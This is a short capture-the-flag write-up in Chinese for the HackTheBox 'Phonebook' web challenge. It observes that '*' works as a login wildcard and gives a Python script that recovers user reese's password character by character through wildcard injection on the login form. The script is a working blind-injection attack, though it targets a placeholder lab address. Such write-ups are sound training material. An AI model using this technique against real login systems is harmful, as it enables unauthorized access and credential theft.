---
title: Phonebook @ HACKTHEBOX Challeges Web
tags: ctf
---

用户名密码使用`*`登录跳转，猜测可以用`*`代替用户名密码字符串。

网页看到用户名reese，写个`python`脚本暴力穷举密码

```python
import requests

list = []
for i in range(33, 127):
    list.append(chr(i))
list.remove('*')

url = 'http://IP:PORT/login'
myobj = {'username': 'reese', 'password': 'brucepass'}
result = ''
flag = 1
while flag == 1:
    flag = 0
    for l in list:
        myobj['password'] = result + l + '*'
        r = requests.post(url, data=myobj)
        if ('No search results' in r.text):
            result += l
            flag = 1
            print(result)
            break
print('Done')
```
